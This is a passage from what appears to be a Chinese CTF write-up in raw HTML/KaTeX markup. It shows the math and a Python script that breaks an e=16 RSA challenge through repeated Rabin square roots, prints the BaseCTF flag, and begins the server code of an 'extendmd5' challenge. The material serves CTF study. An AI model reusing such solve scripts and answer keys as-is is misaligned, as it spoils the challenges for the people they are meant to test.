style="height:3em;"></span><span class="frac-line mtight" style="border-bottom-width:0.049em;"></span></span><span style="top:-3.4623857142857144em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">p</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.344em;"><span></span></span></span></span></span><span class="mclose nulldelimiter sizing reset-size3 size6"></span></span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:1em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">m</span><span class="mord mathrm">o</span><span class="mord mathrm">d</span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">p</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.8777699999999999em;vertical-align:-0.19444em;"></span><span class="mord cjk_fallback">（</span><span class="mord cjk_fallback">详</span><span class="mord cjk_fallback">细</span><span class="mord cjk_fallback">证</span><span class="mord cjk_fallback">明</span><span class="mord cjk_fallback">看</span><span class="mord cjk_fallback">上</span><span class="mord cjk_fallback">面</span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="mord cjk_fallback">中</span><span class="mord mathnormal">x</span><span class="mord mathnormal">e</span><span class="mord mathnormal">n</span><span class="mord mathnormal">n</span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mord cjk_fallback">师</span><span class="mord cjk_fallback">傅</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">文</span><span class="mord cjk_fallback">章</span><span class="mord cjk_fallback">）</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.8641079999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.46375em;vertical-align:0em;"></span><span class="mord mathnormal">c</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.0588899999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:1.0588899999999999em;"><span style="top:-3.4130000000000003em;margin-right:0.05em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mopen nulldelimiter sizing reset-size3 size6"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.9227em;"><span style="top:-2.656em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span><span style="top:-3.2255000000000003em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line mtight" style="border-bottom-width:0.049em;"></span></span><span style="top:-3.4623857142857144em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">p</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.344em;"><span></span></span></span></span></span><span class="mclose nulldelimiter sizing reset-size3 size6"></span></span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.46375em;vertical-align:0em;"></span><span class="mord mathnormal">c</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.0588899999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:1.0588899999999999em;"><span style="top:-3.4130000000000003em;margin-right:0.05em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mopen nulldelimiter sizing reset-size3 size6"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.9227em;"><span style="top:-2.656em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span><span style="top:-3.2255000000000003em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line mtight" style="border-bottom-width:0.049em;"></span></span><span style="top:-3.4623857142857144em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">p</span><span class="mbin mtight">+</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.344em;"><span></span></span></span></span></span><span class="mclose nulldelimiter sizing reset-size3 size6"></span></span></span></span></span></span></span></span></span></span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:1em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">m</span><span class="mord mathrm">o</span><span class="mord mathrm">d</span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">p</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.8777699999999999em;vertical-align:-0.19444em;"></span><span class="mord cjk_fallback">由</span><span class="mord cjk_fallback">条</span><span class="mord cjk_fallback">件</span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">3</span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:1em;"></span></span><span class="base"><span class="strut" style="height:1.0588899999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">m</span><span class="mord mathrm">o</span><span class="mord mathrm">d</span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">4</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">可</span><span class="mord cjk_fallback">知</span><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:1.0588899999999999em;"><span style="top:-3.4130000000000003em;margin-right:0.05em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mopen nulldelimiter sizing reset-size3 size6"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.9227em;"><span style="top:-2.656em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span><span style="top:-3.2255000000000003em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line mtight" style="border-bottom-width:0.049em;"></span></span><span style="top:-3.4623857142857144em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">p</span><span class="mbin mtight">+</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.344em;"><span></span></span></span></span></span><span class="mclose nulldelimiter sizing reset-size3 size6"></span></span></span></span></span></span></span></span></span></span><span class="mord cjk_fallback">可</span><span class="mord cjk_fallback">以</span><span class="mord cjk_fallback">进</span><span class="mord cjk_fallback">行</span><span class="mord cjk_fallback">开</span><span class="mord cjk_fallback">方</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord cjk_fallback">得</span><span class="mord cjk_fallback">：</span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.0588899999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:1.0588899999999999em;"><span style="top:-3.4130000000000003em;margin-right:0.05em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mopen nulldelimiter sizing reset-size3 size6"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.9227em;"><span style="top:-2.656em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">4</span></span></span></span><span style="top:-3.2255000000000003em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line mtight" style="border-bottom-width:0.049em;"></span></span><span style="top:-3.4623857142857144em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">p</span><span class="mbin mtight">+</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.344em;"><span></span></span></span></span></span><span class="mclose nulldelimiter sizing reset-size3 size6"></span></span></span></span></span></span></span></span></span></span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:1em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">m</span><span class="mord mathrm">o</span><span class="mord mathrm">d</span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">p</span><span class="mord cjk_fallback">和</span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.3088899999999999em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:1.0588899999999999em;"><span style="top:-3.4130000000000003em;margin-right:0.05em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mopen nulldelimiter sizing reset-size3 size6"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.9227em;"><span style="top:-2.656em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">4</span></span></span></span><span style="top:-3.2255000000000003em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line mtight" style="border-bottom-width:0.049em;"></span></span><span style="top:-3.4623857142857144em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">p</span><span class="mbin mtight">+</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.344em;"><span></span></span></span></span></span><span class="mclose nulldelimiter sizing reset-size3 size6"></span></span></span></span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:1em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">m</span><span class="mord mathrm">o</span><span class="mord mathrm">d</span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">p</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord cjk_fallback">同</span><span class="mord cjk_fallback">理</span><span class="mord cjk_fallback">得</span><span class="mord cjk_fallback">：</span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.0588899999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:1.0588899999999999em;"><span style="top:-3.4130000000000003em;margin-right:0.05em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mopen nulldelimiter sizing reset-size3 size6"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.9227em;"><span style="top:-2.656em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">4</span></span></span></span><span style="top:-3.2255000000000003em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line mtight" style="border-bottom-width:0.049em;"></span></span><span style="top:-3.4623857142857144em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">q</span><span class="mbin mtight">+</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.344em;"><span></span></span></span></span></span><span class="mclose nulldelimiter sizing reset-size3 size6"></span></span></span></span></span></span></span></span></span></span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:1em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">m</span><span class="mord mathrm">o</span><span class="mord mathrm">d</span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mord cjk_fallback">和</span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">4</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.3088899999999999em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:1.0588899999999999em;"><span style="top:-3.4130000000000003em;margin-right:0.05em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mopen nulldelimiter sizing reset-size3 size6"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.9227em;"><span style="top:-2.656em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">4</span></span></span></span><span style="top:-3.2255000000000003em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line mtight" style="border-bottom-width:0.049em;"></span></span><span style="top:-3.4623857142857144em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">q</span><span class="mbin mtight">+</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.344em;"><span></span></span></span></span></span><span class="mclose nulldelimiter sizing reset-size3 size6"></span></span></span></span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:1em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">m</span><span class="mord mathrm">o</span><span class="mord mathrm">d</span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord cjk_fallback">之</span><span class="mord cjk_fallback">后</span><span class="mord cjk_fallback">对</span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">4</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord cjk_fallback">都</span><span class="mord cjk_fallback">再</span><span class="mord cjk_fallback">进</span><span class="mord cjk_fallback">行</span><span class="mord cjk_fallback">一</span><span class="mord cjk_fallback">次</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal">a</span><span class="mord mathnormal">b</span><span class="mord mathnormal">i</span><span class="mord mathnormal">n</span><span class="mord cjk_fallback">就</span><span class="mord cjk_fallback">可</span><span class="mord cjk_fallback">以</span><span class="mord cjk_fallback">得</span><span class="mord cjk_fallback">到</span><span class="mord">1</span><span class="mord">6</span><span class="mord cjk_fallback">个</span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord cjk_fallback">进</span><span class="mord cjk_fallback">行</span><span class="mord cjk_fallback">筛</span><span class="mord cjk_fallback">选</span><span class="mord cjk_fallback">可</span><span class="mord cjk_fallback">得</span><span class="mord cjk_fallback">最</span><span class="mord cjk_fallback">终</span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">a</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span></span></span></span></span></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> math<br><br>p= <span class="hljs-number">7069399887135404147313451925856463790122288322955120353958439275669624760478622857767374372872346990136954266792268812402268519788981659317134531701377703</span><br>q= <span class="hljs-number">7140401794925570651681210965995716787861669619864423417950517149172165700476247742598189428763096590450485848849559705021102255619953633260576326755189491</span><br>n= <span class="hljs-number">50478355643148266354923007679620780526141911052216183219350733856301203909504117920782157926474133059342037694939720794471142298089233400685616528009799838411628460021560455031638939642439782783664643276781622313533393143794433785002028042268329216889290321025657400866309989050114906562764560145969527319173</span><br>c= <span class="hljs-number">4087656016708624348430154736700209864616058176527780296412388210036556189223356217878476122554309456912053098904757651242467846016533157893713565869179648449607552843430116377433424175512165110689917185788645907642250661954679293286430479127383793220643392349769864898681882146542120386576626400193522553192</span><br>e= <span class="hljs-number">16</span><br>  <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">rabin</span>(<span class="hljs-params">c</span>):<br>    m1 = <span class="hljs-built_in">pow</span>(c, (p + <span class="hljs-number">1</span>) // <span class="hljs-number">4</span>, p)<br>    m2 = p-<span class="hljs-built_in">pow</span>(c, (p + <span class="hljs-number">1</span>) // <span class="hljs-number">4</span>, p)<br>    m3 = <span class="hljs-built_in">pow</span>(c, (q + <span class="hljs-number">1</span>) // <span class="hljs-number">4</span>, q)<br>    m4 = q-<span class="hljs-built_in">pow</span>(c, (q + <span class="hljs-number">1</span>) // <span class="hljs-number">4</span>, q)<br><br>    <span class="hljs-keyword">return</span> m1,m2,m3,m4<br><br>cs = [c]<br>lge=math.log(e,<span class="hljs-number">2</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">int</span>(lge)):<span class="hljs-comment">#range里放log2e</span><br>    t = <span class="hljs-built_in">set</span>()<br>    <span class="hljs-keyword">for</span> c2 <span class="hljs-keyword">in</span> cs:<br>        x = rabin(c2)<br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> x:<br>            t.add(j)<br>    cs = <span class="hljs-built_in">list</span>(t)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> cs:<br>    flag=long_to_bytes(i)<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">b&#x27;BaseCTF&#x27;</span> <span class="hljs-keyword">in</span> flag:<br>        <span class="hljs-built_in">print</span>(flag)<br><span class="hljs-comment">#BaseCTF&#123;01c28b9c-7924-4c04-b71d-1cca15342618&#125;</span><br><br><br></code></pre></td></tr></table></figure><h3 id="extendmd5"><a class="markdownIt-Anchor" href="#extendmd5"></a> extendmd5</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">import</span> socketserver<br><span class="hljs-keyword">import</span> signal<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> random <br>flag = os.getenv(<span class="hljs-string">&#x27;GZCTF_FLAG&#x27;</span>)<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Task</span>(socketserver.BaseRequestHandler):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">_recvall</span>(<span class="hljs-params">self</span>):<br>        BUFF_SIZE = <span class="hljs-number">2048</span><br>        data = <span class="hljs-string">b&#x27;&#x27;</span><br>        <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>            part = <span class="hljs-variable language_">self</span>.request.recv(BUFF_SIZE)<br>            data += part<br>            <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(part) &lt; BUFF_SIZE:<br>                <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">return</span> data.strip()<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title 